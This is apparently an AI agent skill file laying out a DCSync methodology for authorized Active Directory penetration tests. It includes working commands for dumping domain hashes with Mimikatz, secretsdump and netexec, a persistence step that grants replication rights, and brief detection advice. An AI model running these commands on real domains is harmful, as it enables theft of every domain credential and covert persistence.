---
name: dcsync-assessment
description: Active Directory DCSync attack methodology for security assessments. Use this skill when testing AD environments for DCSync vulnerabilities, analyzing replication permissions, or documenting DCSync attack paths. Trigger when users mention DCSync, AD replication attacks, secretsdump, Mimikatz dcsync, or need to enumerate/assess DCSync permissions in authorized penetration testing scenarios.
---

# DCSync Assessment

A skill for understanding and testing DCSync vulnerabilities in Active Directory environments during authorized security assessments.

## Overview

DCSync attacks exploit replication permissions to extract credentials from Domain Controllers. This skill covers enumeration, exploitation, and mitigation of DCSync vulnerabilities.

**⚠️ Authorization Required**: Only use these techniques in environments where you have explicit written authorization. DCSync attacks are legitimate security testing methods but can be destructive if misused.

## What is DCSync?

DCSync simulates a Domain Controller requesting replication data from other DCs using the Directory Replication Service Remote Protocol (MS-DRSR). This protocol is essential for AD replication and cannot be disabled, making it a critical attack vector for credential extraction.

### Required Permissions

The attack requires three specific permissions on the domain:
- **DS-Replication-Get-Changes**
- **Replicating Directory Changes All**
- **Replicating Directory Changes In Filtered Set**

By default, only these groups possess these permissions:
- Domain Admins
- Enterprise Admins
- Administrators
- Domain Controllers

### Key Characteristics

- **Cannot be disabled**: MS-DRSR is a core AD function
- **Reversible encryption**: If enabled, passwords can be extracted in cleartext
- **Valid protocol**: Uses legitimate AD replication mechanisms

## Enumeration

Identify accounts with DCSync permissions using PowerView:

```powershell
Get-ObjectAcl -DistinguishedName "dc=domain,dc=com" -ResolveGUIDs | Where-Object {
    ($_.ObjectType -match 'replication-get') -or 
    ($_.ActiveDirectoryRights -match 'GenericAll') -or 
    ($_.ActiveDirectoryRights -match 'WriteDacl')
}
```

Check for users with reversible encryption enabled:

```powershell
Get-DomainUser -Identity * | Where-Object {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} | Select-Object samaccountname, useraccountcontrol
```

## Exploitation Methods

### Local Exploitation (Mimikatz)

When you have local access to a machine with appropriate permissions:

```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:DOMAIN\\krbtgt"'
```

### Remote Exploitation (Impacket)

From a remote machine using Impacket's secretsdump:

```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
```

Additional options:
- `-just-dc-user <USERNAME>` - Extract specific user credentials
- `-pwd-last-set` - Display password change timestamps
- `-history` - Retrieve password history for offline cracking

### Using Captured DC TGT (Kerberos)

When you have a Domain Controller machine TGT from unconstrained delegation scenarios:

```bash
# Generate krb5.conf for the realm
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# Use netexec with Kerberos cache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  netexec smb <DC_FQDN> --use-kcache --ntds

# Or use Impacket with Kerberos
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```

### Output Files

The `-just-dc` flag produces three files:
1. **NTLM hashes** - For pass-the-hash attacks
2. **Kerberos keys** - For Kerberos-based attacks
3. **Cleartext passwords** - For accounts with reversible encryption enabled

## Persistence

Grant DCSync permissions to maintain access:

```powershell
Add-ObjectAcl -TargetDistinguishedName "dc=domain,dc=com" -PrincipalSamAccountName username -Rights DCSync -Verbose
```

Verify the assignment:

```powershell
Get-ObjectAcl -DistinguishedName "dc=domain,dc=com" -ResolveGUIDs | Where-Object {$_.IdentityReference -match "username"}
```

## Detection and Mitigation

### Security Event IDs

Monitor these events for DCSync activity:
- **4662** - Object access (requires audit policy)
- **5136** - Directory service object modification (requires audit policy)
- **4670** - Permission changes (requires audit policy)

### Tools

- **AD ACL Scanner** - Compare ACL reports over time: https://github.com/canix1/ADACLScanner

## References

- [ired.team - DCSync Guide](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [Yojimbo Security - DCSync](https://yojimbosecurity.ninja/dcsync/)
- [HTB Delegate Walkthrough](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
